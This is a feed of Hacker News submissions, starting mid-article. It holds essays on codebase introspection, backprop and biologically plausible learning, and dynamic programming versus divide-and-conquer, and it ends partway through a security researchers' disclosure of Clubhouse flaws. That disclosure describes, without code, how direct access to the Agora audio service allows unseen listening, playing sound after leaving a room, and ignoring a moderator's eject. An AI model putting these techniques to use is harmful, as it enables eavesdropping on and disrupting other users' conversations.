For another example, consider pubsub (aka emitter-consumer) pipelines. In web services, when you have processing that can happen “in the background”, one service will publish an event; another service subscribes to that event and will do the background processing on its own when it receives the event. Often, these will form event “pipelines” or trees where an event consumer will emit additional events that are consumed by yet other services. These pipelines are concepts that developers talk about (as in, the “account creation pipeline” or “funding reconciliation pipeline”), but in most codebases the pipeline itself isn’t declared or reified anywhere in the code.</p>
<p>
If you’re looking at code that emits an event, how do you find the consumers? If you’re lucky, the event has a unique, literal name and the consumer uses that name literally as well. But maybe some subscribers are using wildcard event names, or names generated by string concatenation, and that becomes a lot harder to grep for. Likewise, if you’re looking at a consumer of an event, how do you find the locations in the codebase that could emit that event<a href="#fn:5" id="fnref:5" title="see footnote">5</a>?</p>
<p>
Wouldn’t it be great to be able to browse those pipelines in a table or perhaps a directed graph<a href="#fn:6" id="fnref:6" title="see footnote">6</a>? Maybe that graph would support some basic operations on this data: searching for specific publishers or subscribers by class name or event name; filtering for pipelines that have run into errors; maybe even showing the flow of a particular event given an event ID<a href="#fn:7" id="fnref:7" title="see footnote">7</a>. And of course, this pipeline browser should be bidirectional with respect to the codebase — there should be a button beside each graph node that shows the code for the publisher or subscriber inline or opens the corresponding code in your editor.</p>
<p>
For a final example, consider code that has functionality inherited from elsewhere. Some environments let you see a <a href="https://www.jetbrains.com/help/idea/viewing-structure-of-a-source-file.html">list of inherited properties</a> or methods, but this isn’t possible for more specialized cases. At Stripe, we have code that implements shell scripts that can take command-line arguments and flags. These arguments are defined via a DSL in the implementing code, but these commands can be subclassed, and there’s no way to see what the available arguments are while working in the subclass.</p>
<h2>
Philosophy</h2>
<p>
I think it’s important to consider these problems not as disparate cases in need of bespoke tooling, but as a <em>class</em> of problems characterized by a lack of access to the data structures embedded within codebases. Just like SQL databases and spreadsheets provide a singular querying abstraction and a set of visualization primitives that can be applied to any kind of data, programming environments need a singular querying abstraction and set of visualization primitives that can be applied to the concepts lurking in codebases. Getting there does <em>not</em> mean using proprietary drag-and-drop visual programming interfaces where the introspection capabilities are limited to whatever the programming environment happens to have implemented. Just the opposite — you should still be able to do whatever you want with your code (including treating it as plain-text files), <em>and also</em> have access to more advanced introspection tools that can query and slice your code — tools that let you easily understand and navigate complex codebases to reduce the <em>incidental complexity</em> of building software.</p>
<h2>
Solutions</h2>
<p>
I don’t have a solution to sell you here (at least, not yet!). But <a href="https://twitter.com/hirday_g/status/1356657607381946369">by popular demand</a> I think it’s worthwhile to at least discuss principles that solutions should embody and directionally-related prior art. </p>
<p>
To start with a simple example, see <a href="https://ihp.digitallyinduced.com/">IHP</a>, a full-stack web framework similar to Rails. It comes with a web interface for manipulating your project’s codebase and database schema. <a href="https://youtu.be/UbDtS_mUMpI?t=102">One point in the introduction video</a> showed changes being made in the visual schema editor being automatically reflected in the SQL code that describes the database schema — and changes being made to the SQL code being bidirectionally reflected in the visual schema editor. </p>
<p>
For a more in-depth example, consider <a href="https://pharo.org/">Pharo</a>, a Smalltalk environment. “Environment” in this case means that it feels like you’re using a custom OS (including global menus, idioms, and keyboard and mouse conventions) designed specifically for browsing, writing, and debugging programs in the Smalltalk programming language<a href="#fn:8" id="fnref:8" title="see footnote">8</a>. The holistic integration of these tools is important. Unlike the programming environments we cobble for ourselves today — where the editor is agnostic of the language and runtime and other tools like debuggers, inspectors, and code browsers are tacked on (if they exist at all) — it’s worth thinking about what an entire computing experience <em>for</em> writing and building custom tools might look like<a href="#fn:9" id="fnref:9" title="see footnote">9</a>.</p>
<p>
Pharo is also interesting because of its Class Browser, which looks like this:</p>
<p>
  <img src="https://files.tanagram.app/file/tanagram-data/prod-feifans-blog/database-codebase-pharo-browser.png" alt="Pharo class browser">
</p>
<p>
This browser breaks free from the source code <em>file</em> as the atomic unit of browsing; instead, it allows the user to browse one method at a time. Making the “unit of browsing” …</p></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://feifan.blog/posts/the-database-inside-your-codebase">https://feifan.blog/posts/the-database-inside-your-codebase</a></em></p>]]>
            </description>
            <link>https://feifan.blog/posts/the-database-inside-your-codebase</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127428</guid>
            <pubDate>Sat, 13 Feb 2021 22:06:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't Mess with Backprop: Doubts about Biologically Plausible Deep Learning]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127387">thread link</a>) | @ericjang
<br/>
February 13, 2021 | https://blog.evjang.com/2021/02/backprop.html | <a href="https://web.archive.org/web/*/https://blog.evjang.com/2021/02/backprop.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-4236921617169203700" itemprop="description articleBody">
<p>Biologically Plausible Deep Learning (BPDL) is an active research field at the intersection of Neuroscience and Machine Learning, studying how we can train deep neural networks with a "learning rule" that could conceivably be implemented in the brain.</p><p>The line of reasoning that typically motivates BPDL is as follows:</p><ol><li>A Deep Neural Network (DNN) can learn to&nbsp;perform perception tasks that biological brains are capable of (such as detecting and recognizing objects).</li><li>If activation units and their weights are to DNNs as&nbsp;what neurons and synapses are to biological brains, then what is <a href="https://en.wikipedia.org/wiki/Backpropagation">backprop </a>(the primary method for training deep neural nets) analogous to?</li><li>If learning rules in brains are not implemented using backprop, then how are they implemented? How can we achieve similar performance to backprop-based update rules while still respecting biological constraints?</li></ol><p>A nice overview of the ways in which backprop is not biologically plausible can be found <a href="https://psychology.stackexchange.com/questions/16269/is-back-prop-biologically-plausible">here</a>, along with various algorithms that propose fixes.</p><p>My somewhat contrarian opinion is that designing biologically plausible alternatives to backprop is the wrong question to be asking. The motivating premises of BPDL makes a faulty assumption: that <b>layer activations are neurons and weights are synapses, and therefore learning-via-backprop must have a counterpart or alternative in biological learning.</b></p><p>Despite the name and their impressive capabilities on various tasks, DNNs actually have very little to do with biological neural networks. One of the great errors in the field of Machine Learning is that we ascribe too much biological&nbsp; meaning to our statistical tools and optimal control algorithms. It leads to confusion from newcomers, who ascribe entirely different meaning to "learning", "evolutionary algorithms", and so on.</p><p>DNNs are a sequence of linear operations interspersed with nonlinear operations, applied sequentially to real-valued inputs - nothing more. They are optimized via gradient descent, and gradients are computed efficiently using a dynamic programming scheme known as backprop. Note that I didn't use the word "learning"!</p><p>Dynamic programming is the ninth wonder of the world<span>1</span>, and in my opinion one of the top three achievements of Computer Science. Backprop has linear time-complexity in network depth, which makes it extraordinarily hard to beat from a computational cost perspective. Many BPDL algorithms often don't do better than backprop, because they try to take an efficient optimization scheme and shoehorn in an update mechanism with additional constraints.&nbsp;</p><p>If the goal is to build a biologically plausible learning mechanism, there's no reason that units in Deep Neural Networks should be one-to-one with biological neurons. Trying to emulate a DNN with models of biologically neurons feels backwards; like trying to emulate the Windows OS with a human brain. It's hard and a human brain can't simulate Windows well.</p><p>Instead, let's do the emulation the other way around: optimizing a function approximator to&nbsp;implement a biologically plausible learning rule. The recipe is straightforward:</p><ol><li>Build a biological plausible model of a neural network with model neurons and synaptic connections. Neurons communicate with each other using spike trains, rate coding, or gradients, and respect whatever constraints you deem to be "sufficiently biologically plausible". It has parameters that need to be trained.</li><li>Use computer-aided search to design a biologically plausible learning rule for these model neurons. For instance, each neuron's feedforward behavior and local update rules can be modeled as a decision from an artificial neural network.</li><li>Update the function approximator so that the biological model produces the desired learning behavior. We could train the neural networks via backprop.&nbsp;</li></ol><p>The choice of function approximator we use to find our learning rule is irrelevant - what we care about at the end of the day is answering how a biological brain is able to learn hard tasks like perception, while respecting known constraints like the fact that biological neurons don't store all activations in memory or only employ local learning rules. We should leverage Deep Learning's ability to find good function approximators, and direct that towards finding a good biological learning rules.</p><p>The insight that we should&nbsp;<i>(artificially)&nbsp;learn to (biologically) learn</i>&nbsp;is not a new idea, but it is one that I think is not yet obvious to the neuroscience + AI community. <a href="https://en.wikipedia.org/wiki/Meta_learning_(computer_science)">Meta-Learning</a>, or "Learning to Learn",&nbsp;is a field that has emerged in recent years, which formulates the act of acquiring a system capable of performing learning behavior (potentially superior to gradient descent). If meta-learning can find us more <a href="https://arxiv.org/pdf/1703.05175.pdf">sample efficient</a> or <a href="https://arxiv.org/abs/1904.07392">superior</a>&nbsp;or <a href="https://arxiv.org/pdf/1906.03367.pdf">robust</a>&nbsp;learners, why can't it find us rules that respect biological learning constraints? Indeed, recent work [<a href="https://arxiv.org/pdf/2006.09549.pdf">1</a>, <a href="https://www.biorxiv.org/content/10.1101/2019.12.30.891184v1.full.pdf">2</a>, <a href="https://arxiv.org/pdf/2012.03837.pdf">3</a>, <a href="https://arxiv.org/abs/1608.05343">4</a>, <a href="http://proceedings.mlr.press/v119/real20a/real20a.pdf">5</a>] shows this to be the case. You can indeed use backprop to train a separate learning rule superior to naïve backprop.</p><p>I think the reason that many researchers have not really caught onto this idea (that we should emulate biologically plausible circuits with a meta-learning approach) is that until recently, compute power wasn't quite strong enough to both train a meta-learner and a learner. It still requires substantial computing power and research infrastructure to set up a meta-optimization scheme, but tools like <a href="https://blog.evjang.com/2019/02/maml-jax.html">JAX make it considerably easier now</a>.</p><p>A true biology purist might argue that finding a learning rule using gradient descent and backprop is not an "evolutionarily plausible learning rule", because evolution clearly lacks the ability to perform dynamic programming or even gradient computation. But this can be amended by making the meta-learner evolutionarily plausible. For instance, the mechanism with which we select good function approximators does not need rely on backprop at all. Alternatively, we could formulate a meta-meta problem whereby the selection process itself obeys rules of evolutionary selection, but the selection process is found using, once again, backprop.</p><p>Don't mess with backprop!</p><p><b>Footnotes</b></p><p>[1] The eighth wonder being, of course, <a href="https://www.listenmoneymatters.com/compound-interest/">compound interest</a>.</p>

</div></div>]]>
            </description>
            <link>https://blog.evjang.com/2021/02/backprop.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127387</guid>
            <pubDate>Sat, 13 Feb 2021 22:01:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dynamic Programming vs. Divide-and-Conquer (2018)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127326">thread link</a>) | @trekhleb
<br/>
February 13, 2021 | https://trekhleb.dev/blog/2018/dynamic-programming-vs-divide-and-conquer/ | <a href="https://web.archive.org/web/*/https://trekhleb.dev/blog/2018/dynamic-programming-vs-divide-and-conquer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>
      <span></span>
  <img alt="Dynamic Programming vs Divide-and-Conquer" title="Dynamic Programming vs Divide-and-Conquer" src="https://trekhleb.dev/static/2207cb6352250f4c7593b87071c55705/9c177/09.png" srcset="https://trekhleb.dev/static/2207cb6352250f4c7593b87071c55705/63868/09.png 250w,
https://trekhleb.dev/static/2207cb6352250f4c7593b87071c55705/0b533/09.png 500w,
https://trekhleb.dev/static/2207cb6352250f4c7593b87071c55705/9c177/09.png 880w" sizes="(max-width: 880px) 100vw, 880px" loading="lazy">
    </span></p>
<h2 id="tldr">TL;DR<a href="#tldr" aria-label="tldr permalink"></a></h2>
<p>In this article I’m trying to explain the difference/similarities between dynamic programing and divide and conquer approaches based on two examples: <a href="https://github.com/trekhleb/javascript-algorithms/tree/master/src/algorithms/search/binary-search">binary search</a> and <a href="https://github.com/trekhleb/javascript-algorithms/tree/master/src/algorithms/string/levenshtein-distance">minimum edit distance</a> (Levenshtein distance).</p>
<h2 id="the-problem">The Problem<a href="#the-problem" aria-label="the problem permalink"></a></h2>
<p>When I <a href="https://github.com/trekhleb/javascript-algorithms">started to learn algorithms</a> it was hard for me to understand the main idea of dynamic programming (<strong>DP</strong>) and how it is different from divide-and-conquer (<strong>DC</strong>) approach. When it gets to comparing those two paradigms usually Fibonacci function comes to the rescue as great <a href="https://stackoverflow.com/questions/13538459/difference-between-divide-and-conquer-algo-and-dynamic-programming">example</a>. But when we’re trying to solve the <strong>same</strong> problem using both DP and DC approaches to explain each of them, it feels for me like we may <strong>lose valuable detail</strong> that might help to catch the difference faster. These detail tells us that each technique serves best for <strong>different</strong> types of problems.</p>
<p>I’m still in the process of understanding DP and DC difference, and I can’t say that I’ve fully grasped the concepts so far. But I hope this article will shed some extra light and help you to do another step of learning such valuable algorithm paradigms as dynamic programming and divide-and-conquer.</p>
<h2 id="dynamic-programming-and-divide-and-conquer-similarities">Dynamic Programming and Divide-and-Conquer Similarities<a href="#dynamic-programming-and-divide-and-conquer-similarities" aria-label="dynamic programming and divide and conquer similarities permalink"></a></h2>
<p>As I see it for now I can say that <strong>dynamic programming is an extension of the divide and conquer paradigm</strong>.</p>
<p>I would <strong>not</strong> treat them as something completely different. Because <strong>they both work by recursively breaking down a problem into two or more sub-problems</strong> of the same or related type, until these become simple enough to be solved directly. The solutions to the sub-problems are then combined to give a solution to the original problem.</p>
<p>So why do we still have different paradigm names then and why I called dynamic programming an extension. It is because dynamic programming approach may be applied to the problem <strong>only if the problem has certain restrictions or prerequisites</strong>. After that dynamic programming extends divide and conquer approach with <strong>memoization</strong> or <strong>tabulation</strong> technique.</p>
<p>Let’s go step by step...</p>
<h2 id="dynamic-programming-prerequisitesrestrictions">Dynamic Programming Prerequisites/Restrictions<a href="#dynamic-programming-prerequisitesrestrictions" aria-label="dynamic programming prerequisitesrestrictions permalink"></a></h2>
<p>As we’ve just discovered there are two key attributes that divide and conquer problem must have in order for dynamic programming to be applicable:</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Optimal_substructure">Optimal substructure</a> - optimal solution can be constructed from optimal solutions of its sub-problems</li>
<li><a href="https://en.wikipedia.org/wiki/Overlapping_subproblems">Overlapping sub-problems</a> - problem can be broken down into sub-problems which are reused several times, or a recursive algorithm for the problem solves the same sub-problem over and over rather than always generating new sub-problems</li>
</ul>
<p>Once these two conditions are met we can say that this divide and conquer problem may be solved using dynamic programming approach.</p>
<h2 id="dynamic-programming-extension-for-divide-and-conquer">Dynamic Programming Extension for Divide and Conquer<a href="#dynamic-programming-extension-for-divide-and-conquer" aria-label="dynamic programming extension for divide and conquer permalink"></a></h2>
<p>Dynamic programming approach extends divide and conquer approach with two techniques (<strong>memoization</strong> and <strong>tabulation</strong>) that both have a purpose of storing and re-using sub-problems solutions that may drastically improve performance. For example naive recursive implementation of Fibonacci function has time complexity of <code>O(2^n)</code> where DP solution doing the same with only <code>O(n)</code> time.</p>
<p><strong>Memoization (top-down cache filling)</strong> refers to the technique of caching and reusing previously computed results. The memoized <code>fib</code> function would thus look like this:</p>
<div data-language="text"><pre><code>memFib(n) {
    if (mem[n] is undefined)
        if (n &lt; 2) result = n
        else result = memFib(n-2) + memFib(n-1)
        mem[n] = result
    return mem[n]
}</code></pre></div>
<p><strong>Tabulation (bottom-up cache filling)</strong> is similar but focuses on filling the entries of the cache. Computing the values in the cache is easiest done iteratively. The tabulation version of <code>fib</code> would look like this:</p>
<div data-language="text"><pre><code>tabFib(n) {
    mem[0] = 0
    mem[1] = 1
    for i = 2...n
        mem[i] = mem[i-2] + mem[i-1]
    return mem[n]
}</code></pre></div>
<p>You may read more about memoization and tabulation comparison <a href="https://programming.guide/dynamic-programming-vs-memoization-vs-tabulation.html">here</a>.</p>
<p>The main idea you should grasp here is that because our divide and conquer problem has overlapping sub-problems the caching of sub-problem solutions becomes possible and thus memoization/tabulation step up onto the scene.</p>
<h2 id="so-what-the-difference-between-dp-and-dc-after-all">So What the Difference Between DP and DC After All<a href="#so-what-the-difference-between-dp-and-dc-after-all" aria-label="so what the difference between dp and dc after all permalink"></a></h2>
<p>Since we’re now familiar with DP prerequisites and its methodologies we’re ready to put all that was mentioned above into one picture.</p>
<p><span>
      <span></span>
  <img alt="Dynamic programming and divide and conquer paradigms dependency" title="Dynamic programming and divide and conquer paradigms dependency" src="https://trekhleb.dev/static/83ee7bbb33a61b7b99fd1ce305fcf3d2/f84cf/02-dp.jpg" srcset="https://trekhleb.dev/static/83ee7bbb33a61b7b99fd1ce305fcf3d2/0479a/02-dp.jpg 250w,
https://trekhleb.dev/static/83ee7bbb33a61b7b99fd1ce305fcf3d2/41099/02-dp.jpg 500w,
https://trekhleb.dev/static/83ee7bbb33a61b7b99fd1ce305fcf3d2/f84cf/02-dp.jpg 880w" sizes="(max-width: 880px) 100vw, 880px" loading="lazy">
    </span></p>
<center><i>
Dynamic programming and divide and conquer paradigms dependency
</i></center>
<p>Let’s go and try to solve some problems using DP and DC approaches to make this illustration more clear.</p>
<h2 id="divide-and-conquer-example-binary-search">Divide and Conquer Example: Binary Search<a href="#divide-and-conquer-example-binary-search" aria-label="divide and conquer example binary search permalink"></a></h2>
<p><a href="https://en.wikipedia.org/wiki/Binary_search_algorithm">Binary search</a> algorithm, also known as half-interval search, is a search algorithm that finds the position of a target value within a sorted array. Binary search compares the target value to the middle element of the array; if they are unequal, the half in which the target cannot lie is eliminated and the search continues on the remaining half until the target value is found. If the search ends with the remaining half being empty, the target is not in the array.</p>
<h3 id="example">Example<a href="#example" aria-label="example permalink"></a></h3>
<p>Here is a visualization of the binary search algorithm where 4 is the target value.</p>
<p><span>
      <span></span>
  <img alt="Binary search algorithm logic" title="Binary search algorithm logic" src="https://trekhleb.dev/static/44dd5f316766aa0f4e89ad4c0ec90070/f84cf/03-binary-search.jpg" srcset="https://trekhleb.dev/static/44dd5f316766aa0f4e89ad4c0ec90070/0479a/03-binary-search.jpg 250w,
https://trekhleb.dev/static/44dd5f316766aa0f4e89ad4c0ec90070/41099/03-binary-search.jpg 500w,
https://trekhleb.dev/static/44dd5f316766aa0f4e89ad4c0ec90070/f84cf/03-binary-search.jpg 880w" sizes="(max-width: 880px) 100vw, 880px" loading="lazy">
    </span></p>
<center><i>
Binary search algorithm logic
</i></center>
<p>Let’s draw the same logic but in form of decision tree.</p>
<p><span>
      <span></span>
  <img alt="Binary search algorithm decision tree" title="Binary search algorithm decision tree" src="https://trekhleb.dev/static/438638666394fc658e41ac0957be0681/65072/04-bs-decision-tree.jpg" srcset="https://trekhleb.dev/static/438638666394fc658e41ac0957be0681/0479a/04-bs-decision-tree.jpg 250w,
https://trekhleb.dev/static/438638666394fc658e41ac0957be0681/41099/04-bs-decision-tree.jpg 500w,
https://trekhleb.dev/static/438638666394fc658e41ac0957be0681/65072/04-bs-decision-tree.jpg 830w" sizes="(max-width: 830px) 100vw, 830px" loading="lazy">
    </span></p>
<center><i>
Binary search algorithm decision tree
</i></center>
<p>You may clearly see here a divide and conquer principle of solving the problem. We’re iteratively breaking the original array into sub-arrays and trying to find required element in there.</p>
<p>Can we apply dynamic programming to it? <strong>No</strong>. It is because <strong>there are no overlapping sub-problems</strong>. Every time we split the array into completely independent parts. And according to divide and conquer prerequisites/restrictions the sub-problems <strong>must be</strong> overlapped somehow.</p>
<p>Normally every time you draw a decision tree and it is actually a <strong>tree</strong> (and <strong>not</strong> a decision <strong>graph</strong>) it would mean that you don’t have overlapping sub-problems and this is not dynamic programming problem.</p>
<h3 id="the-code">The Code<a href="#the-code" aria-label="the code permalink"></a></h3>
<p><a href="https://github.com/trekhleb/javascript-algorithms/tree/master/src/algorithms/search/binary-search">Here</a> you may find complete source code of binary search function with test cases and explanations.</p>
<div data-language="javascript"><pre><code><span>function</span> <span>binarySearch</span><span>(</span><span>sortedArray<span>,</span> seekElement</span><span>)</span> <span>{</span>
  <span>let</span> startIndex <span>=</span> <span>0</span><span>;</span>
  <span>let</span> endIndex <span>=</span> sortedArray<span>.</span>length <span>-</span> <span>1</span><span>;</span>
  <span>while</span> <span>(</span>startIndex <span>&lt;=</span> endIndex<span>)</span> <span>{</span>
    <span>const</span> middleIndex <span>=</span> startIndex <span>+</span> Math<span>.</span><span>floor</span><span>(</span><span>(</span>endIndex <span>-</span> startIndex<span>)</span> <span>/</span> <span>2</span><span>)</span><span>;</span>
    
    <span>if</span> <span>(</span>sortedArray<span>[</span>middleIndex<span>]</span> <span>===</span> seekElement<span>)</span> <span>{</span>
      <span>return</span> middleIndex<span>;</span>
    <span>}</span>
    
    <span>if</span> <span>(</span>sortedArray<span>[</span>middleIndex<span>]</span> <span>&lt;</span> seekElement<span>)</span> <span>{</span>
      
      startIndex <span>=</span> middleIndex <span>+</span> <span>1</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      
      endIndex <span>=</span> middleIndex <span>-</span> <span>1</span><span>;</span>
    <span>}</span>
  <span>}</span>
  <span>return</span> <span>-</span><span>1</span><span>;</span>
<span>}</span></code></pre></div>
<h2 id="dynamic-programming-example-minimum-edit-distance">Dynamic Programming Example: Minimum Edit Distance<a href="#dynamic-programming-example-minimum-edit-distance" aria-label="dynamic programming example minimum edit distance permalink"></a></h2>
<p>Normally when it comes to dynamic programming examples the <a href="https://github.com/trekhleb/javascript-algorithms/tree/master/src/algorithms/math/fibonacci">Fibonacci</a> number algorithm is being taken by default. But let’s take a little bit more complex algorithm to have some kind of variety that should help us to grasp the concept.</p>
<p><a href="https://en.wikipedia.org/wiki/Levenshtein_distance">Minimum Edit Distance</a> (or Levenshtein Distance) is a string metric for measuring the difference between two sequences. Informally, the Levenshtein distance between two words is the minimum number of single-character edits (<em>insertions, deletions or substitutions</em>) required to change one word into the other.</p>
<h3 id="example-1">Example<a href="#example-1" aria-label="example 1 permalink"></a></h3>
<p>For example, the Levenshtein distance between “kitten” and “sitting” is 3, since the following three edits change one into the other, and there is no way to do it with fewer than three edits:</p>
<ul>
<li><strong>k</strong>itten → <strong>s</strong>itten (substitution of “s” for “k”)</li>
<li>sitt<strong>e</strong>n → sitt<strong>i</strong>n (substitution of “i” for “e”)</li>
<li>sittin → sittin<strong>g</strong> (insertion of “g” at the end).</li>
</ul>
<h3 id="applications">Applications<a href="#applications" aria-label="applications permalink"></a></h3>
<p>This has a wide range of applications, for instance, spell checkers, correction systems for optical character recognition, fuzzy string searching, and software to assist natural language translation based on translation memory.</p>
<h3 id="mathematical-definition">Mathematical Definition<a href="#mathematical-definition" aria-label="mathematical definition permalink"></a></h3>
<p>Mathematically, the Levenshtein distance between two strings <code>a</code>, <code>b</code> (of length <code>|a|</code> and <code>|b|</code> respectively) is given by function <code>lev(|a|, |b|)</code> where:</p>
<p><span>
      <span></span>
  <img alt="Mathematical definition" title="Mathematical definition" src="https://trekhleb.dev/static/6c784025b4cfbb2200fcdb61c335fcc3/9c177/05-levinshtein-formula.png" srcset="https://trekhleb.dev/static/6c784025b4cfbb2200fcdb61c335fcc3/63868/05-levinshtein-formula.png 250w,
https://trekhleb.dev/static/6c784025b4cfbb2200fcdb61c335fcc3/0b533/05-levinshtein-formula.png 500w,
https://trekhleb.dev/static/6c784025b4cfbb2200fcdb61c335fcc3/9c177/05-levinshtein-formula.png 880w" sizes="(max-width: 880px) 100vw, 880px" loading="lazy">
    </span></p>
<p>Note that the first element in the minimum corresponds to <strong>deletion</strong> (from <code>a</code> to <code>b</code>), the second to <strong>insertion</strong> and the third to <strong>match or mismatch</strong>, depending on whether the respective symbols are the same.</p>
<h3 id="explanation">Explanation<a href="#explanation" aria-label="explanation permalink"></a></h3>
<p>Ok, let’s try to figure out what that formula is talking about. Let’s take a simple example of finding minimum edit distance between strings <strong>ME</strong> and <strong>MY</strong>. Intuitively you already know that minimum edit distance here is <strong>1</strong> operation and this operation is *“replace <strong>E</strong> with <strong>Y</strong>”*. But let’s try to formalize it in a form of the algorithm in order to be able to do more complex examples like transforming <strong>Saturday</strong> into <strong>Sunday</strong>.</p>
<p>To apply the formula to M<strong>E</strong>→M<strong>Y</strong> transformation we need to know minimum edit distances of ME→M, M→MY and M→M transformations in prior. Then we will need to pick the minimum one and add +1 operation to transform last letters E→Y.</p>
<p>So we can already see here a recursive nature of the solution: minimum edit distance of ME→MY transformation is being calculated based on three previously possible transformations. Thus we may say that this is <strong>divide and conquer algorithm</strong>.</p>
<p>To explain this further let’s draw the following matrix.</p>
<p><span>
      <span></span>
  <img alt="Simple example of finding minimum edit distance between ME and MY strings" title="Simple example of finding minimum edit distance between ME and MY strings" src="https://trekhleb.dev/static/cde5bc27b31d2ee4fbd2221e487eaf2f/f84cf/05-levinshtein-matrix.jpg" srcset="https://trekhleb.dev/static/cde5bc27b31d2ee4fbd2221e487eaf2f/0479a/05-levinshtein-matrix.jpg 250w,
https://trekhleb.dev/static/cde5bc27b31d2ee4fbd2221e487eaf2f/41099/05-levinshtein-matrix.jpg 500w,
https://trekhleb.dev/static/cde5bc27b31d2ee4fbd2221e487eaf2f/f84cf/05-levinshtein-matrix.jpg 880w" sizes="(max-width: 880px) 100vw, 880px" loading="lazy">
    </span></p>
<center><i>
Simple example of finding minimum edit distance between ME and MY strings
</i></center>
<ul>
<li><strong>Cell (0,1)</strong> contains red number 1. It means that we need 1 operation to transform <strong>M</strong> to <strong>empty string</strong>: delete <strong>M</strong>. This is why this number is red.</li>
<li><strong>Cell (0,2)</strong> contains red number 2. It means that we need 2 operations to transform <strong>ME</strong> to <strong>empty string</strong>: delete <strong>E</strong>, delete <strong>M</strong>.</li>
<li><strong>Cell (1,0)</strong> contains green number 1. It means that we need 1 operation to transform empty string to <strong>M</strong>: insert <strong>M</strong>. This is why this number is green.</li>
<li><strong>Cell (2,0)</strong> contains green number 2. It means that we need 2 operations to transform empty string to <strong>MY</strong>: insert <strong>Y</strong>, insert <strong>M</strong>.</li>
<li><strong>Cell (1,1)</strong> contains number 0. It means that it costs nothing to transform <strong>M</strong> to <strong>M</strong>.</li>
<li><strong>Cell (1,2)</strong> contains red number 1. It means that we need 1 operation to transform <strong>ME</strong> to <strong>M</strong>: delete <strong>E</strong>.</li>
<li>And so on...</li>
</ul>
<p>This looks easy for such small matrix as ours (it is only 3x3). But how we could calculate all those numbers for bigger matrices (let’s say 9x7 one, for Saturday→Sunday transformation)?</p>
<p>The good news is that according to the formula you …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://trekhleb.dev/blog/2018/dynamic-programming-vs-divide-and-conquer/">https://trekhleb.dev/blog/2018/dynamic-programming-vs-divide-and-conquer/</a></em></p>]]>
            </description>
            <link>https://trekhleb.dev/blog/2018/dynamic-programming-vs-divide-and-conquer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127326</guid>
            <pubDate>Sat, 13 Feb 2021 21:53:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No one else was in the room where it happened – disturbing the clubhouse peace]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127200">thread link</a>) | @pajowu
<br/>
February 13, 2021 | https://zerforschung.org/posts/clubhouse-endless-audio-fun-en | <a href="https://web.archive.org/web/*/https://zerforschung.org/posts/clubhouse-endless-audio-fun-en">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://d33wubrfki0l68.cloudfront.net/f86427c789d3ed88f9e78be8d68f2d4f1ddcfbda/e4855/p/clubhouse-fun/clubhouse-agora-zerforschung-meme.jpg" alt="Coverimage"></p><h2 id="what-happened-so-far-">What happened so far …</h2><p>In our first <a href="https://zerforschung.org/posts/gespraeche-aus-dem-clubhouse/">thread on Clubhouse (in german)</a> we had only taken a superficial look at Clubhouse.</p><p>We saw that Clubhouse uses an external service provider called Agora.io for the voice call functionality.
Agora.io is also used by many other apps, including a therapy app.
In the thread we found that, among other things, we can easily listen to a room without being displayed to the other room participants if we communicate directly with Agora.</p><p>Conversely, you can also be displayed in a room without listening. However, this is not really a problem - after all, even outside Clubhouse you are often present in conversations without really listening.</p><h2 id="-and-what-happened-next-">… and what happened next …</h2><p>After we published <a href="https://twitter.com/zerforschung/status/1354218368782508037">the Twitter thread</a>, we tried to play sound directly through Agora.
This still worked after we left the room - we could still participate in conversations.</p><video controls="">
<source src="https://d33wubrfki0l68.cloudfront.net/87d9be48b5f4f855673557bd2268476398ece4b3/461a7/m/clubhouse-fun/leave-room.mp4" type="video/mp4"><source src="https://d33wubrfki0l68.cloudfront.net/4564cee5098f5e5234844c16aec2dc45977a4e00/363c4/m/clubhouse-fun/leave-room.webm" type="video/webm"></video><p>Of course, we only tested the whole thing in private rooms so as not to disturb anyone.
The standard behaviour of Clubhouse in private rooms is that all participants are allowed to speak.
Clubhouse also has the feature of a virtual stage, especially for larger, public rooms.
Only those who have been brought onto this stage can speak audibly for the whole room, the rest remain in the virtual audience and can only listen.
After our previous experience, we suspected something bad, so we moved our test account to the Audience.
As expected, everyone in the room was immediately informed that the account could no longer speak and was now in the audience.
However, this account could continue to play sound without any problems, which could be heard throughout the room.</p><video controls="">
<source src="https://d33wubrfki0l68.cloudfront.net/b35bc8c3ac3e24ff95ec32e6017d65e218a74f3e/73335/m/clubhouse-fun/move-audience.mp4" type="video/mp4"><source src="https://d33wubrfki0l68.cloudfront.net/9cec51ef49da99794acc961a9cdb172d61110a7e/2b71f/m/clubhouse-fun/move-audience.webm" type="video/webm"></video><p>Again, the behaviour can be combined with the original discovery - the account can leave the room and then not only continue to listen, but also play sound that is transmitted to everyone in the room.</p><p><strong>Note</strong>: In public rooms, we must have been on stage at least once to speak. After that, however, no one can take away our permission to speak.
You can also activate the virtual stage in private rooms. We can always speak there, even if we had only been in the audience since joining the room.</p><hr><p>Unfortunately, the only feature of Clubhouse that a room moderator could use to prevent unwanted participants (and their audio) is also broken: the eject button.
This “Remove from Room” button only asks the Clubhouse app of the respective user to leave the room.
If the app is modified, it can simply ignore this request and remains in the room.</p><p>If you talk directly to the audio service provider Agora, all the moderation options of the Clubhouse app have no effect. The possibility to play sound continues to work until the room is finally closed for everyone.</p><video controls="">
